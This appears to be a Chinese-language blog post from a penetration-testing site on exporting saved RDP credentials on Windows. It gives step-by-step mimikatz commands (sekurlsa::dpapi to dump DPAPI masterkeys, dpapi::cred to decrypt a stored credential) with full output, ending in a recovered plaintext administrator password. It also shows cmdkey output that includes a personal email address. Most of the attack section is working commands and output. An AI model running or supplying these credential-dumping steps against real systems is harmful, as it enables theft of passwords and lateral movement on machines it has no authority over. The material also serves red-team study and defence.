---
title: "导出 RDP 连接凭据"
date: 2019-07-09T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['rdp','mimikatz']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


rdp 连接记录默认存储在注册表 `HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\` 位置.

通过 `cmdkey /list` 可查看当前用户的所有凭据, 带有 `TERMSRV` 的为 rdp 连接凭据.

<!--more-->

另外比较有趣的是 edge 保存的密码也存储在这里.

```
C:> cmdkey /list

当前保存的凭据:

    目标: LegacyGeneric:target=TERMSRV/10.0.0.100
    类型: 普通
    用户: LAPTOP-MAGICBOO\administrator
    本地机器持续时间

    目标: LegacyGeneric:target=WindowsLive:(token):name=462247949@qq.com;serviceuri=scope=service::user.auth.xboxlive.com::mbi_ssl
    类型: 普通
    用户: 462247949@qq.com
    本地机器持续时间

    目标: LegacyGeneric:target=MicrosoftAccount:user=462247949@qq.com
    类型: 普通
    用户: 462247949@qq.com
    本地机器持续时间
```

3gstudent 大佬获取所有用户 rdp 连接记录的 powershell 脚本.

[List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

## dpapi

dpapi 全程 Data Protection API, 是微软提供的用户凭证保护的 API, 如 Chrome mstsc 等软件就使用这套 API 进行数据加密.

dpapi 中进行数据加解密的操作需要用到 masterkey, 一个用户对应一个 masterkey, masterkey 使用用户密码进行加密.


## 导出 RDP 密码

查看本机所有凭据.

```
C:\Users\exp10it>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
 驱动器 C 中的卷是 Windows
 卷的序列号是 C47D-2E65

 C:\Users\exp10it\AppData\Local\Microsoft\Credentials 的目录

2019/07/09  11:53    <DIR>          .
2019/07/09  11:53    <DIR>          ..
2019/07/09  11:53               482 3743512D9B4C0B672D0D1033FCBC7878
2019/07/08  22:14             2,370 9FB2CBB720B0041CE0C57601AA139C5B
2019/05/02  21:10            11,778 DFBE70A7E5CC19A398EBF1B96859CE5D
2019/07/08  22:11             1,218 E05DBE15D38053457F3523A375594044
2019/07/09  11:42             4,642 ED32ECCED6604759C9327EFF8DA7724F
               5 个文件         20,490 字节
               2 个目录 27,513,999,360 可用字节
```

测试的 rdp 的凭据是这条 `3743512D9B4C0B672D0D1033FCBC7878`.

mimikatz 导出凭据.

```
mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\3743512D9B4C0B672D0D1033FCBC7878
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {f07bdf43-6d13-4957-94c0-bc0094da1667}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : 本地凭据数据

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : d67176a569ededc3993dd9cdad3f4e732697fd7631d7f9d361b6fc0b9ea4e1d5
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 71c8c8a37137442e23c43f2fc18588a90b1ea2d01748bd6ad9e338090b39f96e
  dwDataLen          : 000000f0 - 240
  pbData             : 86c88f7bebed6169e34c9e7ac9d8d051452e3bfa9593349bf3b753d4e50418b96b8a3f6e333e2fc3aa03a73757e51e6ed8bfdffa1f8ab0cf0edb26dc23919e772d5da9f82675ed737034427a0ef25ad66fda6992c91110a998f8c5727632a9d572ca48c2857b1ac63d8b44f8ada20d6ac1abd7db922d7b8ac030e26e7fb5663bba50feb90212924e91ee1981900887412c133e5c3c062944fca832cf173f7e8c3f1668053f40594902aa0caa5b4d842f70590dbe2ac94ad1a787ec02cf0115f4dfc1d6a8a84ec547a3d332dc730f9404fc3549ee065e1b312ce820c1c836a1293c77a476d1e969f15aa7f6bbc20a72f1
  dwSignLen          : 00000040 - 64
  pbSign             : 3e9591523e57d626376e9fb77354d29faf91d83b0312a9205b27d81ac2fdeb69912e6a1a3f46be4bc023a6f0833440f92862b9169a20ca53540a83959bf9b145
```

通过 sekurlsa 模块导出所有用户的 masterkey.

```
mimikatz # sekurlsa::dpapi

Authentication Id : 0 ; 1482199 (00000000:00169dd7)
Session           : Interactive from 1
User Name         : exp10it
Domain            : LAPTOP-MAGICBOO
Logon Server      : (null)
Logon Time        : 2019/7/8 22:11:02
SID               : S-1-5-21-470597163-2784945203-3219526951-1001
         [00000000]
         * GUID      :  {f07bdf43-6d13-4957-94c0-bc0094da1667}
         * Time      :  2019/7/9 12:02:13
         * MasterKey :  7daaec86a9ff317da98d8fa955bd9112b2adfd864552d2e64066820c42daa8a37ba8cf0b9f35d99b0b5d3d3e7ff6bbfe0a0b5e710473fb3a3e7aee056f2b6393
         * sha1(key) :  f7d1c2f24e1d3a27c3becf10ed42acd890eb5e14

......
```

再次执行命令, 指定 masterkey 参数.

```
mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\3743512D9B4C0B672D0D1033FCBC7878 /masterkey:7daaec86a9ff317da98d8fa955bd9112b2adfd864552d2e64066820c42daa8a37ba8cf0b9f35d99b0b5d3d3e7ff6bbfe0a0b5e710473fb3a3e7aee056f2b6393
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {f07bdf43-6d13-4957-94c0-bc0094da1667}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : 本地凭据数据

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : d67176a569ededc3993dd9cdad3f4e732697fd7631d7f9d361b6fc0b9ea4e1d5
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 71c8c8a37137442e23c43f2fc18588a90b1ea2d01748bd6ad9e338090b39f96e
  dwDataLen          : 000000f0 - 240
  pbData             : 86c88f7bebed6169e34c9e7ac9d8d051452e3bfa9593349bf3b753d4e50418b96b8a3f6e333e2fc3aa03a73757e51e6ed8bfdffa1f8ab0cf0edb26dc23919e772d5da9f82675ed737034427a0ef25ad66fda6992c91110a998f8c5727632a9d572ca48c2857b1ac63d8b44f8ada20d6ac1abd7db922d7b8ac030e26e7fb5663bba50feb90212924e91ee1981900887412c133e5c3c062944fca832cf173f7e8c3f1668053f40594902aa0caa5b4d842f70590dbe2ac94ad1a787ec02cf0115f4dfc1d6a8a84ec547a3d332dc730f9404fc3549ee065e1b312ce820c1c836a1293c77a476d1e969f15aa7f6bbc20a72f1
  dwSignLen          : 00000040 - 64
  pbSign             : 3e9591523e57d626376e9fb77354d29faf91d83b0312a9205b27d81ac2fdeb69912e6a1a3f46be4bc023a6f0833440f92862b9169a20ca53540a83959bf9b145

Decrypting Credential:
 * volatile cache: GUID:{f07bdf43-6d13-4957-94c0-bc0094da1667};KeyHash:f7d1c2f24e1d3a27c3becf10ed42acd890eb5e14
 * masterkey     : 7daaec86a9ff317da98d8fa955bd9112b2adfd864552d2e64066820c42daa8a37ba8cf0b9f35d99b0b5d3d3e7ff6bbfe0a0b5e710473fb3a3e7aee056f2b6393
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000ea - 234
  credUnk0       : 00000000 - 0

  Type           : 00000001 - 1 - generic
  Flags          : 00000000 - 0
  LastWritten    : 2019/7/9 3:53:56
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : LegacyGeneric:target=TERMSRV/10.0.0.100
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : LAPTOP-MAGICBOO\administrator
  CredentialBlob : admin03!@#
  Attributes     : 0
```